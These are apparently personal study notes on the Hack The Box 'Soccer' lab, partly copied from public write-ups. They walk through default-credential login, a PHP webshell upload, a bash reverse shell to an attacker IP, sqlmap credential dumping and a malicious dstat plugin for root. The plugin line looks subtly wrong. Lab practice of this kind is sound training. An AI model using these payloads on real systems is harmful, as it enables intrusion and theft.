#Soccer #Easy #Linux #ReverseShell
# Second step : 

Go in soccer.htb, but by default i can't go to the website.

So I need to add in (sudo vi /etc/hosts) and you press i to modify the file and then you add  10.129.1.124    soccer.htb  
and you quit by pressing esc then writing :wq

reason why add this?

Your browser **does not know** what soccer.htb is.

So when the server says _“go to soccer.htb”_, your computer is like:

> ❓ “Who?? Where??”

➡️ Connection fails.

When to know when we need to add the host : it's when in nmap there is this Did not follow redirect to http://soccer.htb/


# Third Step :

I need to find subdomains in soccer.htb so I run this command : gobuster dir -u http://soccer.htb \  -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt \
-o root.gobuster

And I find that there is http://soccer.htb/tiny/ 

# Tiny File Manager : Fourth Step

`/tiny` is an instance of Tiny File Manager:

 ![image-20230604140005575](https://0xdf.gitlab.io/img/image-20230604140005575.png)

This is a common name for software, but searching for it with the term “CCP Programmers” finds the source [on GitHub](https://github.com/prasathmani/tinyfilemanager), where it describes itself as:

> TinyFileManager is web based PHP file manager and it is a simple, fast and small size in single-file PHP file that can be dropped into any folder on your server, multi-language ready web application for storing, uploading, editing and managing files and folders online via web browser. The Application runs on PHP 5.5+, It allows the creation of multiple users and each user can have its own directory and a built-in support for managing text files with cloud9 IDE and it supports syntax highlighting for over 150+ languages and over 35+ themes.

## Shell as www-data

### Authenticate to Tiny File Manager

On the README file, it gives the following instructions for how to set up Tiny File Manager:

> Default username/password: **admin/admin@123** and **user/12345**.

That gives two sets of default credentials, “admin” / “admin@123” and “user” / “12345”. Both sets of credentials work here. I’ll log in as admin.

### Tiny File Manager

Logged in, the page show the files that are part of the Soccer website:

 ![image-20230604142515207](https://0xdf.gitlab.io/img/image-20230604142515207.png)

The URL is `http://soccer.htb/tiny/tinyfilemanager.php?p=`, which shows that the server is running PHP.

The `tiny` directory has the filemanager page, as well as the `uploads` directory:

 ![image-20230604142608344](https://0xdf.gitlab.io/img/image-20230604142608344.png)

`uploads` is empty:

 ![image-20230604142623505](https://0xdf.gitlab.io/img/image-20230604142623505.png)

### Shell

I’ll make a simple PHP webshell:

```
<?php system($_REQUEST["cmd"]); ?>
```

#### Explanation of the script

 This script enables the execution of arbitrary system commands on the target server by directly passing user‑controlled input through a URL parameter. When the parameter is supplied in an HTTP request, its value is processed by the server‑side PHP interpreter and forwarded to the underlying operating system via the system() function. As a result, the web application effectively exposes a command execution interface, allowing an attacker to run operating system–level commands with the same privileges as the web server process, which can lead to full system compromise.


I’ll use the “Upload” button, and it offers a way to upload:

 ![image-20230604142956658](https://0xdf.gitlab.io/img/image-20230604142956658.png)

If I try to upload in `/var/www/html/`, it fails:

 ![image-20230604143018728](https://0xdf.gitlab.io/img/image-20230604143018728.png)

If I navigate to `/tiny/uploads` and then click “Upload”, it works:

 ![image-20230604143115422](https://0xdf.gitlab.io/img/image-20230604143115422.png)


# Fifth step : 

So I put this request in BURP Repeater which is soccer.htb/tiny/uploads/malicious.php then i modify the request parameter to POST 

But before I continue : 

I need to put this commande in the terminal : nc -lvnp 9001
then in cmd I write this : cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.110/9001+0>%261' 


---

# Sixth Step : 

1) Then to have an interactive terminal you do : python3 -c 'import pty; pty.spawn("/bin/bash")' 
2) then you press enter and control z.
3) And you do :  stty raw -echo;fg then you press enter
4) And you do export TERM=xterm


# Seventh Step : 

I need to go in cd / and then explore a little bit. I go in home i see a player folder where there is a user.txt but I can't open it because permission denied. So I thought of what we seen in the nmap at the start (port 9091) --> the cannot get (it's suspicious). So I go in wappalyzer and I see that the webserver is nginx so in their terminal I put this command : find / -type d -name nginx 2>/dev/null

As a result, I found /etc/nginx is there so lets explore it ;


In the folder sites-enables, I found the folder sites-enabled where there was a web server called soc-player.soccer.htb and I needed to add the host in sudo vi /etc/hosts

![[../../../../ALL-assets/Pasted image 20260213000304.png]]


# Eight Step : 


Explanation of Websockets : 

WebSocket is a communication protocol providing full-duplex, bidirectional communication channels over a single, persistent TCP connection, designed for real-time applications.
WebSocket  : C'est comme si tu avais un interphone directement relié à la cuisine sur ta table. Une fois la connexion établie, le micro reste ouvert. Tu peux dire "J'ai faim" à tout moment, et le chef peut te crier "C'est prêt !" dès que l'assiette sort du feu, sans que tu aies besoin de demander "Est-ce que c'est prêt ?" toutes les deux minutes.

On voit que dans soc-player.soccer.htb il y ait un text input field alors essayons sqlmap : 
1) sqlmap -u 'ws://soc-player.soccer.htb/9091' --data '{"id":"*"}' --batch --level 5 --risk 3 --threads 10
(I knew that it was port 9091 because of the page source of the website )
2) sqlmap -u 'ws://soc-player.soccer.htb/9091' --data '{"id":"*"}' --batch --level 5 --risk 3 --threads 10 --dbs (to enumerate database , bref, montrer les databases présents)
3) sqlmap -u 'ws://soc-player.soccer.htb/9091' --data '{"id":"*"}' --batch --level 5 --risk 3 --threads 10 --dbs       ( I found soccer_db)
4) sqlmap -u 'ws://soc-player.soccer.htb/9091' --data '{"id":"*"}' --batch --level 5 --risk 3 --threads 10 -D soccer_db --tables.      (we find account)
5) sqlmap -u 'ws://soc-player.soccer.htb/9091' --data '{"id":"*"}' --batch --level 5 --risk 3 --threads 10 -d soccer_db -T accounts --dump. 
====
(I found this) ![[../../../../ALL-assets/Pasted image 20260213235715.png]]

Then I connect to ssh with player@soccer.htb and then put your password
I can than cat user.txt to find the user txt
# Nineth Step

find / -perm -4000 2>/dev/null

Le but est de lister tous les fichiers du système possédant le droit **SUID**, afin d'identifier des programmes exécutables avec les privilèges du propriétaire (souvent **root**) que tu pourrais exploiter pour élever tes propres privilèges.


![[../../../../ALL-assets/Pasted image 20260214000701.png]]

Explanation of this sentence : 

permit nopass player as root cmd /usr/bin/dstat

**En résumé :** Le système autorise l'utilisateur `player` à exécuter `/usr/bin/dstat` avec les droits `root` sans jamais demander de mot de passe.


Then I do that by following the steps about doas and dstat exploitation that I found on the net : 

![[../../../../ALL-assets/Pasted image 20260214001529.png]]

Step by Step explanation : 

Contexte : En sécurité informatique et sous Linux, le **SUID** (pour _Set User ID_) est un type spécial de permission de fichier qui permet à un utilisateur d'exécuter un programme avec les privilèges du **propriétaire** du fichier plutôt que les siens.

https://binsec.nl/posts/hackthebox-write-up-soccer/ copy this one interesting 
Linpeas sert a koi ?

https://olivierkonate.medium.com/hackthebox-soccer-d369c340890a

## Privilege Escalation (better understanding nineth)[](https://binsec.nl/posts/hackthebox-write-up-soccer/#privilege-escalation)

### Enumeration[](https://binsec.nl/posts/hackthebox-write-up-soccer/#enumeration-1)

After downloading `linpeas.sh` to the machine, we can start enumerating.

`|   |   | |---|---| ||player@soccer:/tmp$ curl 10.10.16.4:8000/linpeas.sh -o linpeas.sh                                                                                                                            <br>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                                                                                              <br>                                 Dload  Upload   Total   Spent    Left  Speed                                                                                                                <br>100  820k  100  820k    0     0   593k      0  0:00:01  0:00:01 --:--:--  592k<br>player@soccer:/tmp$ bash linpeas.sh<br>...<br>                     ╔════════════════════════════════════╗                                                                                                                                 <br>══════════════════════╣ Files with Interesting Permissions ╠══════════════════════                                                                                                           <br>                      ╚════════════════════════════════════╝                                                                                                                                 <br>╔══════════╣ SUID - Check easy privesc, exploits and write perms<br>╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid<br>-rwsr-xr-x 1 root root 42K Nov 17  2022 /usr/local/bin/doas|`   

From the output of `linpeash.sh` we can see that the software `/usr/local/bin/doas` is installed on this machine. `doas` is similar to the `sudo` command, and it executes arbitrary commands as another. First, we search for the `doas.conf` file. On cherche le fichier `doas.conf` parce que c'est **le fichier de configuration principal** qui définit qui a le droit d'exécuter quelles commandes avec les privilèges d'un autre utilisateur (généralement `root`).

`|   |   | |---|---| ||player@soccer:~$ find / -type f -name "doas.conf" 2>/dev/null<br>/usr/local/etc/doas.conf|`

### Creating malicious plugin[](https://binsec.nl/posts/hackthebox-write-up-soccer/#creating-malicious-plugin)

If we read this configuration file, we see that the user account player has the privileges to run `/usr/bin/dstat` as root without a password.

`|   |   | |---|---| ||player@soccer:~$ cat /usr/local/etc/doas.conf <br>permit nopass player as root cmd /usr/bin/dstat|`

The next step is to configure `doas` to use this configuration file at executing.

`|   |   | |---|---| ||player@soccer:~$ doas -C /usr/local/etc/doas.conf|`

Next, we need to check the location of `dstat` to create a malicious plugin. `dstat` supports custom plugins, and since we have permission to run this software as root via `doas` without needing a password, we can achieve privilege escalation through this malicious plugin to create a reverse shell or spawn a shell as `root`.

`|   |   | |---|---| ||player@soccer:~$ find / -type d -name dstat 2>/dev/null<br>/usr/share/doc/dstat<br>/usr/share/dstat<br>/usr/local/share/dstat|`

We now know that `dstat` is looking in the `/usr/local/share/dstat`. Create a plugin called `dstat_privesc.py`, with the following contents:

`|   |   | |---|---| ||import os<br><br>os.system('chown +x /usr/bin/bash')|`

### Own Soccer[](https://binsec.nl/posts/hackthebox-write-up-soccer/#own-soccer)

The name of the plugin is determined by the suffix of the file name, e.g. `dstat_<plugin_name>.py`. Now let’s add our newly created plugin

`|   |   | |---|---| ||player@soccer:/usr/local/share/dstat$ dstat --list \| grep privesc<br>        privesc|`

The plugin is loaded. Let’s own this machine.

`|   |   | |---|---| ||player@soccer:/usr/local/share/dstat$ doas /usr/bin/dstat --privesc<br>/usr/bin/dstat:2619: DeprecationWarning: the imp module is deprecated in favour of importlib; see the module's documentation for alternative uses<br>  import imp<br>Module dstat_privesc failed to load. (name 'dstat_plugin' is not defined)<br>None of the stats you selected are available.<br>player@soccer:/usr/local/share/dstat$ ls<br>dstat_privesc.py<br>player@soccer:/usr/local/share/dstat$ bash -p<br>bash-5.0# whoami<br>root<br>bash-5.0#|`

We have owned `soccer` from Hack The Box.

`|   |   | |---|---| ||bash-5.0# cat /root/root.txt|` see other soccer writeups and export pdf to discord after insihed